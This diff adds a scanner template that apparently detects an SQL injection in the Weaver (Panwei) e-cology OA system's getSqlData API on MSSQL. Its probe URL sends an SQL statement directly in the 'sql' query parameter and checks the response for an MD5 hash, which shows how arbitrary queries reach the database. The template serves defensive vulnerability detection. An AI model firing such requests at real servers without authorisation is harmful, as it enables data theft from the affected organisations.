@@ -1,0 +1,28 @@
+id: weaver-ecology-getsqldata-sqli
+brief:
+    title: Weaver E-Cology `getsqldata` - SQL Injection
+    by: SleepingBag945
+    level: high
+    about: When the getSqlData interface of the Panwei e-cology OA system uses the mssql database, the built-in SQL statements are not spliced strictly, resulting in a SQL injection vulnerability.
+    label:
+        - ecology
+        - weaver
+        - oa
+        - sqli
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes(''MD5'',''{{num}}'')),3,32)'
+        - '{{BaseURL}}/Api/portal/elementEcodeAddon/getSqlData?sql='
+      signs:
+        - "on": word
+          has:
+            - '{{md5(num)}}'
+          in: body
+        - "on": word
+          has:
+            - '{"api_status":'
+            - '"status":true}'
+          in: body
+          need: all
